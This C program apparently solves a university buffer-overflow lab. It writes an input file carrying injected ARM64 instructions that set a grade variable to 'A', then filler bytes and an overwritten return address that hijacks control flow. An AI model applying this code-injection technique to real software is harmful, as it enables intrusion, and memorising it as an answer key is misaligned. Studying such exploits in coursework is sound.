#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *psFile;
    unsigned int uiAdr;
    unsigned int uiMov;
    unsigned int uiStrb;
    unsigned int uiB;
    unsigned long ulAddress;
    char* name = "Jacob";
    int i;

    psFile = fopen("dataA", "w");

    for (i = 0; i < 5; i++) {
        char n = *name;
        /* fwrite(&n, sizeof(char), 1, psFile); */
        fprintf(psFile, "%c", n);
        name++;
    }

    putc('\0', psFile);

    /* adr x0, grade */
    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420088);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);

    /* mov x1, 'A' */
    uiMov = MiniAssembler_mov(1, 'A');
    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);

    /* strb x1, [x0] */
    uiStrb = MiniAssembler_strb(1, 0);
    fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);

    /* b 0x400864 */
    uiB = MiniAssembler_b(0x400864, 0x420100);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);

    /* filler to overflow buffer */
    for (i = 0; i < 26; i++) {
        fprintf(psFile, "%c", 'a');
    }

    ulAddress = 0x420070;

    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    return 0;
}
